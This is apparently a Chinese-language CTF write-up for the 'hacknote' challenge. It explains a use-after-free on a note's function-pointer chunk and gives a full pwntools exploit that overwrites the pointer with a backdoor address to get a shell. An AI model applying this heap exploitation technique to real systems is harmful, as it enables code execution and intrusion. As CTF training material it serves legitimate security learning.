稍微总结一下现在已知的内容：
首先每次选择add_noted的时候，相当于malloc了两个空间，8字节的那一个空间用来存储一个函数指针，另一个空间才是根据我们输入的size，malloc的空间。所以这里我们想到使用UAF。



如果我们在free掉chunk1、chunk2之后add_note一个8自己大小的note，那么首先chunk2就会分配给add_note的第一个malloc，而接下来的malloc因为大小是8字节，glibc malloc就会把chunk1分配给他，这样我们将他的地址修改为后门函数地址，之后选择print功能，就可以实现get shell的目的。

from pwn import *
context(os='linux' , arch = 'amd64' , log_level= 'debug')
p=process('./hacknote')
magic=0x08048986
def debug(msg=''):
    gdb.attach(p,'')
    pause()
def add(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Note size :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    p.sendline(content)
def printf(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))
def delete(index):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
def exit():
    p.recvuntil('Your choice :')
    p.sendline('4')
#debug()
add(0x20,'a'*4)
add(0x20,'b'*4)
add(0x20,'c'*4)
delete(0)
delete(1)
add(0x8,p32(magic))
printf(0)
p.interactive()
